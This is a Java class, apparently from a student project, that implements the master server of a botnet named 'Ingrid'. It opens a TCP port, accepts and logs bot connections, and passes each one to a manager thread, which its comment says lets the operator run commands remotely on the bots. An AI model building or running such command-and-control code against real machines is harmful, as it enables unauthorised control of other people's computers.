/*
 * Classe responsavel por gerenciar a BotNet Ingrid
 * Criar um servidor TCP, aguarda novas conexoes de bots
 * Lista bots disponiveis na rede
 * Permite executar comandos remotamente nos bots
 */
package edu.br.utfpr.projectingrid.Core;

import edu.br.utfpr.projectingrid.Setup.Setup;
import edu.br.utfpr.projectingrid.View.BotMasterView;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.JFrame;

/**
 *
 * @author Francisco Xavier 12/05/2018
 */
public class BotMaster extends Thread{
    private static ServerSocket socket;
    private BotMasterView viewBotMaster;
    
    public BotMaster(BotMasterView viewBotMaster){
         try {
			socket = new ServerSocket(Setup.porta);
	} catch (IOException e1) {
			e1.printStackTrace();
	}
	this.viewBotMaster = viewBotMaster;
        System.out.println("BotMaster rodando na porta = "
				+ socket.getLocalPort());
	
    }    
    @Override
    public void run() {
        while (true) {
	    try {
		Socket conexao = socket.accept();
                System.out.println("Bot Connetado");
		System.out.println("HOSTNAME = " + conexao.getInetAddress().getHostName());
		System.out.println("HOST ADDRESS = " + conexao.getInetAddress().getHostAddress());
		System.out.println("PORTA LOCAL = " + conexao.getLocalPort());
                System.out.println("PORTA DE CONEXAO = " + conexao.getPort());
		System.out.println("======================================");
		new BotManager(conexao).start();
                
                viewBotMaster.IngridPrompt("Ingrid:// novo bot connectado...");
	    } catch (IOException e) {
		e.printStackTrace();
            }
	}
    }
    
}
